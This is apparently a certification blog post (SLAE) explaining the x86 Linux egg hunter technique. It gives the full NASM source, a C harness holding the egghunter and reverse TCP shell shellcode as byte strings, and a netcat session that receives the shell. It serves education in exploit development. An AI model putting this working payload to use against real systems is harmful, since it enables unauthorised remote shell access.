For the third assignment for the SLAE, you are tasked to create an Egghunter shellcode. This is a rather unique challenge, since this was not covered at all during the SLAE coursework. Let's jump into how to go about learning and evenutally creating an egghunter shellcode!



What Exactly is an Egg Hunter?
-----------------------------
The best way to learn how to write an "egg hunter" is to learn about what an "egg hunter" is fundamentally. Basically, when you want to inject shellcode into an application that is found to have a buffer overflow vulnerability, most of the time you have a certain amount of allocated space to work with. With many applications, this allocated space is not nearly enough space for the shellcode to be placed.

To get around this barrier, a technique was discovered in order to get shellcode execution with very minimal memory imapct. This is what is known as an egg hunter. You place an "egg" into the buffer overflow/injection vulnerability along with instructions to locate the egg in memory. Once this shellcode executes, it will search throughout memory for this unique string, and once it locates it, it will then execute the shellcode that is located directly after the egg.

During research on this topic, a famous paper appeared almost right away as the golden reference on this subject. It is a research [paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) written by the author "skape" which describes multiple ways to search memory and profile it by using assembly. This will be a major reference for the proof of concept illustrated later on in this blog.

Now let's look into how an egg hunter shellcode will be structured and developed.


Egg Hunter Structure
--------------------

 So the first thing noticable from the skape paper, is that there are multiple ways to try and attempt to create an egg hunter shellcode. There are a couple system calls (syscalls) that can be used, and for this assignment, the `access(2)` syscall will be used. According to the `unistd.h` file mentioned in the first blog post, the value to be associated with `access(2)` is `33`.

The next notable thing about the `access(2)` syscall, is the way it will be used in this context. Normally, this syscall is used to check if the user running the process has access to a certain file. For the purpose of this assignment, we will be using it as an error handler, giving it memory locations and analyzing if it throws a specific error or not.

Reading the `man` page for `access(2)`, it shows that upon trying to access a space that is outside your access range, it will provide an `EFAULT` error.


There isn't too much else to preamble for this shellcode, so let's jump into dissecting the shellcode.



Egg Hunter Shellcode
--------------------

The very first thing that we will do load our "egg" into the ESI register. This will be what our shellcode will be looking for in order to find our real shellcode to execute in memory. The egg could be anything, as long as it fills 8 bytes of data

```nasm
mov esi, 0xdeadc0de
```

The next thing we will do is establish two functions, one that will put the value of `4095` into `dx`. We will be accessing and checking the page files within the linux enviornment, which are normally a total of `4096` bytes. The hex value of `4096` is `0x1000`. This contains nulls, which might muck up our shellcode, so instead we load `4095` which has the hex value of `0xfff`. We will be adding this into a function called `following_page` so that once our shellcode goes through the first memory page and doesn't find the egg, it will load the next 4095 bytes and loop through again. 

```nasm
following_page:

	or dx, 0xfff
```

Now we will set up another function called `test_next`, which will first increment `EDX` to make the value `4096`, load the `access(2)` syscall, put the next 8 bytes of memeory into `EBX` and then run the `access(2)` syscall on that memory address. Then, we comapre the value inside of `al` (which holds syscall return values) with the opcode of the `EFAULT` error as described above, `0xf2` as seen in the file `/usr/include/asm-generic/errno-base.h`

Next, if the `EFAULT` error is thrown, our shellcode will go back to the `following_page` function to check the following memory page.


Let's see what this looks like below:

```nasm
test_next:
        inc edx ; Make EDX "4096"
        mov al, 33 ; set the value of the access syscall
        lea ebx, [edx + 0x8] ; Load the address of the following 8 bytes
        int 0x80 ; Start the check if the memory is accessible
	cmp al, 0xf2 ; Compares the syscall value of access, and the value of the EFAULT error
        je short following_page ; If EFAULT thrown, go back and check the follwing memory page
	
```

If the memory can be accessed, and the `EFAULT` error doesn't get thrown, we then compare the `DWORD` inside the accessible memory to see if our egg is within it. If it isn't, it will go back back to `test_next` function to keep testing the memory page.

```nasm
        cmp [edx], esi ; If memory can be accessed, check for the egg inside ESI
        jnz short test_next ; Go back and keep testing if the egg wasn't found
```

In order to test for false positives and for the off chance that our egg shows up in memory outside of our control, we load the next DWORD in the accessible memory, to check for the second part of our egg. We will be loading our egg into our shellcode as `deadc0dedeadc0de` to avoid possibly reading only one `deadc0de` in memory that doesn't contain our shellcode. 

If the second `DWORD` does not contain the egg again, we loop back to the `test_next` function to keep testing for our egg within memory.


```nasm
        lea ebx, [edx + 0x4] ; If the first part of the egg is found, load the next DWORD into ebx
        cmp [ebx], esi ; Compare the DWORD to the first part of the EGG
        jnz short test_next ; Go back if the next DWORD does not contain the egg (this is to avoid false positives).
```

If the second `DWORD` does contain our egg, we will load this memory address into `EDX` since this is the address that starts our desired shellcode. We then `jmp` to this memory address which will then begin the execution of our shellcode.


```nasm
        lea edx, [ebx + 0x4] ; If the second part of the egg is found, load that memory address, since our shellcode is what follows.
        jmp edx ; Execute shellcode
```


Let's see the full egg hunter shellcode:

```nasm
global _start


section .text


_start:

        ; Load our "egg" into ESI
        mov esi, 0xdeadc0de

following_page:

        or dx, 0xfff ; Load 4095 into dx

test_next:
        inc edx ; Make EDX "4096"
        mov al, 33 ; set the value of the access syscall
        lea ebx, [edx + 0x8] ; Load the address of the following 8 bytes
        int 0x80 ; Start the check if the memory is accessible


        cmp al, 0xf2 ; Compares the syscall value of access, and the value of the EFAULT error
        je short following_page ; If EFAULT thrown, go back and check the follwing memory page

        cmp [edx], esi ; If memory can be accessed, check for the egg inside ESI
        jnz short test_next ; Go back and keep testing if the egg wasn't found

        lea ebx, [edx + 0x4] ; If the first part of the egg is found, load the next DWORD into ebx
        cmp [ebx], esi ; Compare the DWORD to the first part of the EGG
        jnz short test_next ; Go back if the next DWORD does not contain the egg (this is to avoid false positives).

        lea edx, [ebx + 0x4] ; If the second part of the egg is found, load that memory address, since our shellcode is what follows.
        jmp edx ; Execute shellcode
```



Utilizing Egg Hunter Shellcode
------------------------------

So in order to actually use this egg hunter shellcode, we will need to create a C program that will actually execute this, along with load our reverse TCP shell shellcode into memory as well.

Editing the C program provided by the SLAE labs, we get the following:


```c
#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = "\x31\xdb\x31\xc9\x31\xd2\xbe\xde\xc0\xad\xde\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x32\x75\xee\x8d\x5a\x04\x39\x33\x75\xe7\x8d\x53\x04\xff\xe2";
unsigned char shellcode[] = "\xde\xc0\xad\xde\xde\xc0\xad\xde\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x02\xb1\x01\xb2\x06\x66\xb8\x67\x01\xcd\x80\x89\xc3\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main(void)
{
    printf("Egg hunter length: %d\n", strlen(egghunter));
    printf("Shellcode length: %d\n", strlen(shellcode));

    void (*s)() = (void *)egghunter;
    s();

    return 0;
}
```

This creates a variable for our egg hunter shellcode, obtained using `objdump` on the compiled binary (compilation and `objdump` usage shown in previous blogs) as well as a variable for the `objdump` output from the reverse TCP shell assignment in the previous blog.

It then prints out the length of the egg hunter shellcode as well as our reverse TCP shellcode and then executes it.

As you can see at the beginning of the `shellcode` variable, it contains `\xde\xc0\xad\xde\xde\xc0\xad\xde`. This is `deadc0dedeadc0de` in Little Endian format. So when the egg hunter shellcode executes, if it finds the two instances of our egg, it will the execute the shellcode after the eggs. 

Now let's compile this C program and execute it.


```sh
anubis@ubuntu:~/SLAE/Assignment_3$ gcc -fno-stack-protector -z execstack egg.c -o egghunteranubis@ubuntu:~/SLAE/Assignment_3$ 
```

Now to execute the `egghunter` binary and set up a listening shell on port `4444` which we configured in our shellcode in the previous assignment.


```sh
anubis@ubuntu:~/SLAE/Assignment_3$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

Now that the listener is set up, let's execute our binary and obtain our reverse shell.

```sh
anubis@ubuntu:~/SLAE/Assignment_3$ ./egghunter 
Egg hunter length: 46
Shellcode length: 87
```

```sh
anubis@ubuntu:~/SLAE/Assignment_3$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 46184)

```

As seen in the previous blog, there is a notification that a connection has been made but no initial output. But once commands are executed, it is seen that we have successfully made the target connect back to our listener.


```sh
anubis@ubuntu:~/SLAE/Assignment_3$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 46184)
id
uid=1000(anubis) gid=1000(anubis) groups=1000(anubis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
hostname
ubuntu
ls
compile.sh
egg
egg.c
egg.nasm
egg.o
egghunter
pwd
/home/anubis/SLAE/Assignment_3

```

Success! This assignment is now complete and we can move on to the next one!




<hr />

This blog post was created as per the requirements of the Security Tube Linux Assembly Expert certification.

Student ID: SLAE-1406

Please see [https://github.com/AnubisSec/SLAE](https://github.com/AnubisSec/SLAE) for all the source files mentioned on this site.





